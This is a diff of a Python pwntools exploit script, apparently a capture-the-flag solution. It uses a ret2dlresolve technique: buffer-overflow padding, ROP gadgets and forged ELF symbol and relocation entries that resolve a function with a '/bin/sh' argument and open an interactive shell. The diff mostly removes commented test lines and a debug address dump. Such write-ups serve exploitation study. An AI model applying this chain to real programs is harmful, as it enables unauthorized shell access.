@@ -57,19 +57,10 @@ fake_symstr = fake_symtab + 0x18
 st_name = fake_symstr - STRTAB
 bin_sh = fake_symstr + 0x8
 
-#0x000000000040112e <+8>:     lea    rax,[rbp-0xd]
 
 set_rdi = 0x000000000040112e
 
 
-#some test
-
-#rop = ROP(elf)
-#rop.call(0x401020, [0x404768])
-#log.info(rop.dump())
-#pause()
-
-#some test
 ### Sending
 # writing to RW area RW_AREA+0xd
 payload = b"A"*0xd
@@ -79,7 +70,7 @@ payload += p64(set_rdi)
 r.sendline(payload)
 
 # We send the payload containing the fake structures
-stage2 = b"A"*0xd 
+stage2 = b"A"*0xd
 stage2 += p64(set_rdi) + p64(elf.sym._start)
 stage2 += p64(PLT)
 stage2 += p64(reloc_arg)
@@ -111,9 +102,6 @@ stage2 += p64(0xdeadbeef)
 
 r.sendline(stage2)
 
-
-
-
 #sleep(0.1)
 
 
@@ -125,24 +113,5 @@ r.sendline(payload)
 r.sendline(b"\x00")
 
 
-
-
-
-
 #========= interactive ====================
 r.interactive()
-
-
-
-'''
-[DEBUG] Symtab: 0x4003e0
-[DEBUG] Strtab: 0x400470
-[DEBUG] Versym: 0x4004f4
-[DEBUG] Jmprel: 0x400590
-[DEBUG] ElfSym addr: 0x404e08
-[DEBUG] ElfRel addr: 0x404e20
-[DEBUG] Symbol name addr: 0x404e00
-[DEBUG] Version index addr: 0x400b22
-[DEBUG] Data addr: 0x404e00
-[DEBUG] PLT_INIT: 0x401020
-'''
